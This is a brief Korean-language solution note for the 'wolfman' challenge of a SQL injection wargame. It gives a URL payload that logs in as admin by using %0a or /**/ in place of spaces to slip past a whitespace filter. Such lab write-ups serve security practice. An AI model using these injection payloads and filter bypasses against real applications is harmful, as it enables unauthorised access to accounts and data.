# Payload
```text
https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw=0%27%0aor%0aid=%27admin%27%0a--%0a%27
```
- 공백을 필터링하는 정규식이 있어 공백이 포함될 경우, 대치를 통해 우회해야 한다.
- 공백 -> %0a 또는 `/**/`로 우회 가능하다.
- 정확한 pw를 물어보는건 아니니 blind sql injection으로 비밀번호를 확인할 필요는 없다.
